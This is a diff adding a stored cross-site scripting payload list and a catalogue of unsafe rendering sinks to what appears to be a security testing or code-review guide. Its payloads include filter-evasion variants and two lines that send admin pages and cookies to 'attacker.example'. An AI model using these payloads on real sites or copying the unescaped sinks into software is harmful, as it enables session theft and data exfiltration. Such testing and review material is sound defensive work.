@@ -30,6 +30,112 @@ The unsafe assumption is that stored data is safe to render as markup. This maps
 | **Weak controls** | Regex denylist only, `|safe` / `@Html.Raw`, JSP scriptlets, missing auto-escape in templates |
 | **High impact views** | Admin dashboards, moderator queues, exports—stored payloads often hit privileged users |
 
+## Attack Payloads
+
+Use these in authorized tests when user input is persisted and later rendered in HTML. Confirm the output context (element body, attribute, script block, URL) before relying on a single payload.
+
+### Pattern 1: Basic script tag (HTML body context)
+
+```html
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+```
+
+### Pattern 2: Event handlers without script tags
+
+```html
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+```
+
+### Pattern 3: Attribute breakout (when value is quoted)
+
+```html
+"><script>alert(1)</script>
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+```
+
+### Pattern 4: JavaScript URL and data URIs
+
+```html
+<a href="javascript:alert(1)">click</a>
+<iframe src="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+```
+
+### Pattern 5: Filter evasion and encoding variants
+
+```html
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=&#97;lert(1)>
+```
+
+### Pattern 6: Stored payloads targeting privileged views
+
+```html
+<script>fetch('/admin/users').then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+btoa(t)))</script>
+<img src=x onerror="new Image().src='https://attacker.example/?c='+document.cookie">
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for these patterns on every read path from persistence to HTML output. Any API that marks user data as safe HTML or disables auto-escaping is a review priority.
+
+### Python (Flask / Jinja2)
+
+```python
+return render_template_string(user_bio)
+return Markup(user_comment)
+return render_template("profile.html", bio=bio | safe)
+env = Environment(autoescape=False)
+Template(user_stored_template).render()
+```
+
+### Java (JSP / servlets)
+
+```jsp
+<%= request.getAttribute("comment") %>
+<c:out value="${comment}" escapeXml="false"/>
+<div>${userBio}</div>
+response.getWriter().write(storedNote);
+```
+
+### C# (ASP.NET / Razor)
+
+```csharp
+@Html.Raw(Model.UserBio)
+return Content(storedHtml, "text/html");
+writer.Write(storedComment);  // no encoding
+```
+
+### JavaScript (SPA / Node rendering)
+
+```javascript
+element.innerHTML = storedComment;
+document.write(userBio);
+$('#bio').html(storedProfile);
+dangerouslySetInnerHTML={{ __html: userBio }}
+```
+
+### HTML (email and static builders)
+
+```html
+<!-- Server builds HTML email with unencoded stored name -->
+<p>Hello, <!-- USER_NAME inserted raw --></p>
+<td>{{stored_cell_value}}</td>  <!-- template without escape -->
+```
+
+### Go (html/template misuse)
+
+```go
+template.HTML(storedBio)  // bypasses auto-escape
+fmt.Fprintf(w, "<p>%s</p>", storedComment)  // raw write
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
